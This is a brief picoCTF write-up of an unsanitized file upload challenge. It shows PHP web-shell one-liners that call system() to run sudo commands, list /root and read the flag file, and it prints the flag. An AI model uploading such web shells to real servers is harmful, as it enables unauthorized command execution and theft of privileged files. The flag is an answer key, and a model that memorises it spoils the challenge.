vulnerability: Unsanitized file uploads

Vulnerability can be exploited by uploading a malicious php file with our payload.

The CTF description said the flag is located in /root directory. 

after checking our permissions: 
<?php system('sudo -l'); ?> 

I found that we have sudo access on that machine. So i listed the contents of /the root folder
<?php system('sudo ls /root'); ?> 

found that there is in fact a flag.txt
<?php system('sudo cat /root/flag.txt'); ?> 
gave me the flag

flag: picoCTF{wh47_c4n_u_d0_wPHP_5f3c22c0}
